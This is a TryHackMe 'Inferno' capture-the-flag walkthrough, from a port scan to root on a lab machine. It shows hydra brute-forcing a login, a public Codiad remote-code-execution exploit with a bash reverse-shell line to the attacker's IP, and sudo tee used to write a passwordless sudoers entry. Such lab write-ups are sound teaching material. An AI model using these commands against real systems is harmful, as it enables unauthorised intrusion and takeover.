# **Inferno - TryHackMe**

*Target Ip. Address: 10.49.186.74*

Let's start with the nmap scan.

Nmap took a long time, so went with rustscan.

```bash
kali@kali:rustscan -a 10.49.186.74                                                                                                                            
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.49.186.74:21
Open 10.49.186.74:22
Open 10.49.186.74:23
Open 10.49.186.74:25
Open 10.49.186.74:464
Open 10.49.186.74:750
Open 10.49.186.74:777
Open 10.49.186.74:775
Open 10.49.186.74:779
Open 10.49.186.74:783
Open 10.49.186.74:808
Open 10.49.186.74:873
Open 10.49.186.74:1001
Open 10.49.186.74:1178
Open 10.49.186.74:1210
Open 10.49.186.74:1236
Open 10.49.186.74:194
Open 10.49.186.74:389
Open 10.49.186.74:443
Open 10.49.186.74:636
Open 10.49.186.74:1529
Open 10.49.186.74:2121
Open 10.49.186.74:2150
Open 10.49.186.74:2601
Open 10.49.186.74:2600
Open 10.49.186.74:2608
Open 10.49.186.74:2605
Open 10.49.186.74:2602
Open 10.49.186.74:2603
Open 10.49.186.74:2604
Open 10.49.186.74:2607
Open 10.49.186.74:2606
Open 10.49.186.74:2988
Open 10.49.186.74:2989
Open 10.49.186.74:2003
Open 10.49.186.74:2000
Open 10.49.186.74:4224
Open 10.49.186.74:4557
Open 10.49.186.74:4559
Open 10.49.186.74:4600
Open 10.49.186.74:4949
Open 10.49.186.74:5051
Open 10.49.186.74:5052
Open 10.49.186.74:5355
Open 10.49.186.74:5354
Open 10.49.186.74:5432
Open 10.49.186.74:5555
Open 10.49.186.74:5667
Open 10.49.186.74:5666
Open 10.49.186.74:5674
Open 10.49.186.74:5675
Open 10.49.186.74:5680
Open 10.49.186.74:6566
Open 10.49.186.74:6667
Open 10.49.186.74:6514
Open 10.49.186.74:8021
Open 10.49.186.74:8081
Open 10.49.186.74:8088
Open 10.49.186.74:8990
Open 10.49.186.74:9098
Open 10.49.186.74:9359
Open 10.49.186.74:9418
Open 10.49.186.74:9673
Open 10.49.186.74:10000
Open 10.49.186.74:10081
Open 10.49.186.74:10082
Open 10.49.186.74:10083
Open 10.49.186.74:11201
Open 10.49.186.74:15345
Open 10.49.186.74:17001
Open 10.49.186.74:17002
Open 10.49.186.74:17004
Open 10.49.186.74:17003
Open 10.49.186.74:20011
Open 10.49.186.74:20012
Open 10.49.186.74:24554
Open 10.49.186.74:27374
Open 10.49.186.74:30865
Open 10.49.186.74:57000
Open 10.49.186.74:60177
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 15:09 +0545
Initiating Ping Scan at 15:09
Scanning 10.49.186.74 [4 ports]
Completed Ping Scan at 15:09, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:09
Completed Parallel DNS resolution of 1 host. at 15:09, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:09
Scanning 10.49.186.74 (10.49.186.74) [80 ports]
Discovered open port 443/tcp on 10.49.186.74
Discovered open port 25/tcp on 10.49.186.74
Discovered open port 22/tcp on 10.49.186.74
Discovered open port 21/tcp on 10.49.186.74
Discovered open port 23/tcp on 10.49.186.74
Discovered open port 8990/tcp on 10.49.186.74
Discovered open port 57000/tcp on 10.49.186.74
Discovered open port 2602/tcp on 10.49.186.74
Discovered open port 2600/tcp on 10.49.186.74
Discovered open port 20012/tcp on 10.49.186.74
Discovered open port 808/tcp on 10.49.186.74
Discovered open port 2601/tcp on 10.49.186.74
Discovered open port 4949/tcp on 10.49.186.74
Discovered open port 2605/tcp on 10.49.186.74
Discovered open port 5052/tcp on 10.49.186.74
Discovered open port 2606/tcp on 10.49.186.74
Discovered open port 17002/tcp on 10.49.186.74
Discovered open port 5674/tcp on 10.49.186.74
Discovered open port 2988/tcp on 10.49.186.74
Discovered open port 27374/tcp on 10.49.186.74
Discovered open port 2150/tcp on 10.49.186.74
Discovered open port 11201/tcp on 10.49.186.74
Discovered open port 15345/tcp on 10.49.186.74
Discovered open port 9673/tcp on 10.49.186.74
Discovered open port 636/tcp on 10.49.186.74
Discovered open port 389/tcp on 10.49.186.74
Discovered open port 10000/tcp on 10.49.186.74
Discovered open port 750/tcp on 10.49.186.74
Discovered open port 10083/tcp on 10.49.186.74
Discovered open port 1001/tcp on 10.49.186.74
Discovered open port 20011/tcp on 10.49.186.74
Discovered open port 2604/tcp on 10.49.186.74
Discovered open port 6566/tcp on 10.49.186.74
Discovered open port 4557/tcp on 10.49.186.74
Discovered open port 783/tcp on 10.49.186.74
Discovered open port 1178/tcp on 10.49.186.74
Discovered open port 17004/tcp on 10.49.186.74
Discovered open port 2608/tcp on 10.49.186.74
Discovered open port 2000/tcp on 10.49.186.74
Discovered open port 24554/tcp on 10.49.186.74
Discovered open port 2989/tcp on 10.49.186.74
Discovered open port 10081/tcp on 10.49.186.74
Discovered open port 464/tcp on 10.49.186.74
Discovered open port 1236/tcp on 10.49.186.74
Discovered open port 5354/tcp on 10.49.186.74
Discovered open port 8021/tcp on 10.49.186.74
Discovered open port 777/tcp on 10.49.186.74
Discovered open port 873/tcp on 10.49.186.74
Discovered open port 6667/tcp on 10.49.186.74
Increasing send delay for 10.49.186.74 from 0 to 5 due to 15 out of 49 dropped probes since last increase.
Discovered open port 1210/tcp on 10.49.186.74
Discovered open port 5355/tcp on 10.49.186.74
Discovered open port 17001/tcp on 10.49.186.74
Discovered open port 775/tcp on 10.49.186.74
Increasing send delay for 10.49.186.74 from 5 to 10 due to max_successful_tryno increase to 4
Discovered open port 4559/tcp on 10.49.186.74
Discovered open port 2607/tcp on 10.49.186.74
Discovered open port 5432/tcp on 10.49.186.74
Discovered open port 5555/tcp on 10.49.186.74
Discovered open port 2003/tcp on 10.49.186.74
Discovered open port 17003/tcp on 10.49.186.74
Discovered open port 8081/tcp on 10.49.186.74
Discovered open port 5675/tcp on 10.49.186.74
Discovered open port 5680/tcp on 10.49.186.74
Discovered open port 4600/tcp on 10.49.186.74
Discovered open port 5666/tcp on 10.49.186.74
Discovered open port 1529/tcp on 10.49.186.74
Increasing send delay for 10.49.186.74 from 10 to 20 due to 11 out of 12 dropped probes since last increase.
Discovered open port 779/tcp on 10.49.186.74
Discovered open port 6514/tcp on 10.49.186.74
Discovered open port 30865/tcp on 10.49.186.74
Discovered open port 2603/tcp on 10.49.186.74
Discovered open port 5667/tcp on 10.49.186.74
Discovered open port 9418/tcp on 10.49.186.74
Discovered open port 194/tcp on 10.49.186.74
Discovered open port 194/tcp on 10.49.186.74
Discovered open port 4224/tcp on 10.49.186.74
Discovered open port 9359/tcp on 10.49.186.74
Discovered open port 5051/tcp on 10.49.186.74
Increasing send delay for 10.49.186.74 from 20 to 40 due to 11 out of 11 dropped probes since last increase.
Discovered open port 60177/tcp on 10.49.186.74
Discovered open port 8088/tcp on 10.49.186.74
Discovered open port 9098/tcp on 10.49.186.74
Discovered open port 30865/tcp on 10.49.186.74
Discovered open port 2121/tcp on 10.49.186.74
Discovered open port 5667/tcp on 10.49.186.74
Discovered open port 2603/tcp on 10.49.186.74
Discovered open port 9098/tcp on 10.49.186.74
Discovered open port 4224/tcp on 10.49.186.74
Discovered open port 10082/tcp on 10.49.186.74
Completed SYN Stealth Scan at 15:09, 8.90s elapsed (80 total ports)
Nmap scan report for 10.49.186.74 (10.49.186.74)
Host is up, received echo-reply ttl 62 (0.44s latency).
Scanned at 2026-02-16 15:09:40 +0545 for 9s

PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 62
22/tcp    open  ssh              syn-ack ttl 62
23/tcp    open  telnet           syn-ack ttl 62
25/tcp    open  smtp             syn-ack ttl 62
194/tcp   open  irc              syn-ack ttl 62
389/tcp   open  ldap             syn-ack ttl 62
443/tcp   open  https            syn-ack ttl 62
464/tcp   open  kpasswd5         syn-ack ttl 62
636/tcp   open  ldapssl          syn-ack ttl 62
750/tcp   open  kerberos         syn-ack ttl 62
775/tcp   open  entomb           syn-ack ttl 62
777/tcp   open  multiling-http   syn-ack ttl 62
779/tcp   open  unknown          syn-ack ttl 62
783/tcp   open  spamassassin     syn-ack ttl 62
808/tcp   open  ccproxy-http     syn-ack ttl 62
873/tcp   open  rsync            syn-ack ttl 62
1001/tcp  open  webpush          syn-ack ttl 62
1178/tcp  open  skkserv          syn-ack ttl 62
1210/tcp  open  eoss             syn-ack ttl 62
1236/tcp  open  bvcontrol        syn-ack ttl 62
1529/tcp  open  support          syn-ack ttl 62
2000/tcp  open  cisco-sccp       syn-ack ttl 62
2003/tcp  open  finger           syn-ack ttl 62
2121/tcp  open  ccproxy-ftp      syn-ack ttl 62
2150/tcp  open  dynamic3d        syn-ack ttl 62
2600/tcp  open  zebrasrv         syn-ack ttl 62
2601/tcp  open  zebra            syn-ack ttl 62
2602/tcp  open  ripd             syn-ack ttl 62
2603/tcp  open  ripngd           syn-ack ttl 62
2604/tcp  open  ospfd            syn-ack ttl 62
2605/tcp  open  bgpd             syn-ack ttl 62
2606/tcp  open  netmon           syn-ack ttl 62
2607/tcp  open  connection       syn-ack ttl 62
2608/tcp  open  wag-service      syn-ack ttl 62
2988/tcp  open  hippad           syn-ack ttl 62
2989/tcp  open  zarkov           syn-ack ttl 62
4224/tcp  open  xtell            syn-ack ttl 62
4557/tcp  open  fax              syn-ack ttl 62
4559/tcp  open  hylafax          syn-ack ttl 62
4600/tcp  open  piranha1         syn-ack ttl 62
4949/tcp  open  munin            syn-ack ttl 62
5051/tcp  open  ida-agent        syn-ack ttl 62
5052/tcp  open  ita-manager      syn-ack ttl 62
5354/tcp  open  mdnsresponder    syn-ack ttl 62
5355/tcp  open  llmnr            syn-ack ttl 62
5432/tcp  open  postgresql       syn-ack ttl 62
5555/tcp  open  freeciv          syn-ack ttl 62
5666/tcp  open  nrpe             syn-ack ttl 62
5667/tcp  open  unknown          syn-ack ttl 62
5674/tcp  open  hyperscsi-port   syn-ack ttl 62
5675/tcp  open  v5ua             syn-ack ttl 62
5680/tcp  open  canna            syn-ack ttl 62
6514/tcp  open  syslog-tls       syn-ack ttl 62
6566/tcp  open  sane-port        syn-ack ttl 62
6667/tcp  open  irc              syn-ack ttl 62
8021/tcp  open  ftp-proxy        syn-ack ttl 62
8081/tcp  open  blackice-icecap  syn-ack ttl 62
8088/tcp  open  radan-http       syn-ack ttl 62
8990/tcp  open  http-wmap        syn-ack ttl 62
9098/tcp  open  unknown          syn-ack ttl 62
9359/tcp  open  unknown          syn-ack ttl 62
9418/tcp  open  git              syn-ack ttl 62
9673/tcp  open  unknown          syn-ack ttl 62
10000/tcp open  snet-sensor-mgmt syn-ack ttl 62
10081/tcp open  famdc            syn-ack ttl 62
10082/tcp open  amandaidx        syn-ack ttl 62
10083/tcp open  amidxtape        syn-ack ttl 62
11201/tcp open  smsqp            syn-ack ttl 62
15345/tcp open  xpilot           syn-ack ttl 62
17001/tcp open  unknown          syn-ack ttl 62
17002/tcp open  unknown          syn-ack ttl 62
17003/tcp open  unknown          syn-ack ttl 62
17004/tcp open  unknown          syn-ack ttl 62
20011/tcp open  unknown          syn-ack ttl 62
20012/tcp open  ss-idi-disc      syn-ack ttl 62
24554/tcp open  binkp            syn-ack ttl 62
27374/tcp open  subseven         syn-ack ttl 62
30865/tcp open  unknown          syn-ack ttl 62
57000/tcp open  unknown          syn-ack ttl 62
60177/tcp open  unknown          syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
           Raw packets sent: 181 (7.940KB) | Rcvd: 96 (4.184KB)
```

We have so many open ports, all useless. Let's do service scan on port 22 and 80, rest we can see if needed.

```bash
kali@kali:nmap -sV -sC -p 22,80 10.49.186.74
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 15:18 +0545
Nmap scan report for 10.49.186.74 (10.49.186.74)
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a7:9d:5e:61:89:3c:87:67:0f:3d:bf:cf:7a:12:de:61 (RSA)
|   256 6b:cd:b8:32:ee:61:e4:58:88:46:1f:90:e0:46:98:74 (ECDSA)
|_  256 d3:85:1e:64:47:c7:c6:78:9d:d8:21:c8:87:c6:27:91 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dante's Inferno
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds
```

Now, let's see what we have on the website at port 80.

Nothing that interesting, let's try gobuster.

```bash
kali@kali:gobuster dir -u http://10.49.186.74 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.186.74
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
inferno              (Status: 401) [Size: 459]
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================
```

So, let's see in /inferno as it has 401 status code.

It has a basic authentication form. We don't have any usernames, let's use hydra with username admin.

```bash
kali@kali:hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.49.186.74 http-get /inferno/ -t 64                                                         
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-16 15:25:56
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.49.186.74:80/inferno/
[STATUS] 13214.00 tries/min, 13214 tries in 00:01h, 14331185 to do in 18:05h, 64 active
[80][http-get] host: 10.49.186.74   login: admin   password: d...1
[STATUS] attack finished for 10.49.186.74 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-16 15:27:02
```

Woah! We have a valid password for user admin. I thought, I will be stuck here.

Let's login with the credentials we have.

<img width="1233" height="949" alt="image" src="https://github.com/user-attachments/assets/db6fc8af-5008-4655-89c5-e18d76904c29" />

It seems we can read the files, but have no write access. From the title, we know it is Codiad. Let's see if it has any exploits.

Found a authenticated RCE for Codiad. "*https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit*"

```bash
kali@kali:python2 codiad.py http://admin:d...1@10.49.186.74/inferno/ admin d...1 192.168.130.26 4444 linux
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/192.168.130.26/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
{"status":"error","message":"No Results Returned"}
[+] Exploit finished!
[+] Enjoy your reverse shell!
```

Before running this, in 2 terminals follow the command it has asked to do.

```bash
kali@kali:echo 'bash -c "bash -i >/dev/tcp/192.168.130.26/4445 0>&1 2>&1"' | nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.130.26] from (UNKNOWN) [10.49.186.74] 46148
```

```bash
kali@kali:penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/ip-10-49-186-74~10.49.186.74-Linux-x86_64/2026_02_16-15_38_18-741.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$
```

We have a shell as www-data. 

```bash
kali@kali:penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/ip-10-49-186-74~10.49.186.74-Linux-x86_64/2026_02_16-15_58_41-139.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ exit
[-] Session [1] died... We lost ip-10-49-186-74~10.49.186.74-Linux-x86_64 💔
```

Our session dies in every 1 minute or so. So, type "*screen*" command to stabilize ourselves.

```bash
kali@kali:penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 192.168.130.26:4445
[+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/ip-10-49-186-74~10.49.186.74-Linux-x86_64/2026_02_16-16_02_43-481.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ screen
[screen is terminating]
www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ 
```

After screen get's terminated, again type "*screen*", so that next termination, we don't get kicked out. Perform this until, we find another pivot.

After some time roaming here and there, I found .download.dat at dante's Downloads directory.

```bash
www-data@ip-10-49-186-74:/home/dante/Downloads$ cat .download.dat 
c2 ab 4f 72 ...... 6d 33 0a
```

It is a simple hex, we can decode it in cyberchef.

After decoding, it looks like this.

```decoded
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1...m3
```

It has a password of dante at bottom, let;s login via ssh as user dante to get proper tty.

```bash
kali@kali:ssh dante@10.49.186.74
The authenticity of host '10.49.186.74 (10.49.186.74)' can't be established.
ED25519 key fingerprint is: SHA256:PpqiCUrfu7mamLs2uhroTrhbRniyUUd4F46o6V85WzQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.186.74' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dante@10.49.186.74's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 16 Feb 2026 10:00:10 AM UTC
  System load:  0.0               Processes:2255
  Usage of /:   78.7% of 8.76GB   Users logged in:       0
  Memory usage: 42%               IPv4 address for ens5: 10.49.186.74
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
dante@ip-10-49-186-74:~$
```

First flag is at dante's home directory. 

```bash
dante@ip-10-49-186-74:~$ cat local.txt 
77.....35
```

Let's see if we have sudo privileges.

```bash
dante@ip-10-49-186-74:~$ sudo -l
Matching Defaults entries for dante on ip-10-49-186-74:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on ip-10-49-186-74:
    (root) NOPASSWD: /usr/bin/tee
```

We can use /usr/bin/tee as root, so we have write access anywhere in this machine.

```bash
dante@ip-10-49-186-74:~$ echo "dante ALL=(ALL) NOPASSWD:ALL" | sudo /usr/bin/tee /etc/sudoers.d/dante
dante ALL=(ALL) NOPASSWD:ALL
```

Check the sudo privileges now.

```bash
dante@ip-10-49-186-74:~$ sudo -l
Matching Defaults entries for dante on ip-10-49-186-74:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on ip-10-49-186-74:
    (ALL) NOPASSWD: ALL
    (root) NOPASSWD: /usr/bin/tee
```

We added ourselves with nopassword for any sudo privileges. Now, we can simply be root.

```bash
dante@ip-10-49-186-74:~$ sudo -i
root@ip-10-49-186-74:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Let's read the final flag and end this challenge.

```bash
root@ip-10-49-186-74:~# cat proof.txt 
Congrats!

You've rooted Inferno!

f3.....44

mindsflee
```
